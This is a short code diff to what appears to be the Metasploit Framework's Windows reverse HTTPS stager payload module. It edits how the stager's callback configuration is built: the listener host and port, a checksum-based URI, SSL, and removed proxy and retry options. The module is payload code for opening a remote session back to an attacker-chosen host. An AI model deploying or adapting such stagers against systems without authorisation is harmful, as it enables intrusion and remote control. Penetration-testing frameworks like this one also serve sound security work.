@@ -40,11 +40,10 @@ module Payload::Windows::ReverseHttps
     # Generate the simple version of this stager if we don't have enough space
     if self.available_space.nil? || required_space > self.available_space
       return generate_reverse_https(
-        ssl:  true,
         host: datastore['LHOST'],
         port: datastore['LPORT'],
-        url:  generate_small_uri,
-        retry_count: datastore['StagerRetryCount'])
+        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW),
+        ssl:  true)
     end
 
     conf = {
@@ -52,13 +51,7 @@ module Payload::Windows::ReverseHttps
       host: datastore['LHOST'],
       port: datastore['LPORT'],
       url:  generate_uri,
-      exitfunk: datastore['EXITFUNC'],
-      proxy_host: datastore['PayloadProxyHost'],
-      proxy_port: datastore['PayloadProxyPort'],
-      proxy_user: datastore['PayloadProxyUser'],
-      proxy_pass: datastore['PayloadProxyPass'],
-      proxy_type: datastore['PayloadProxyType'],
-      retry_count: datastore['StagerRetryCount']
+      exitfunk: datastore['EXITFUNC']
     }
 
     generate_reverse_https(conf)
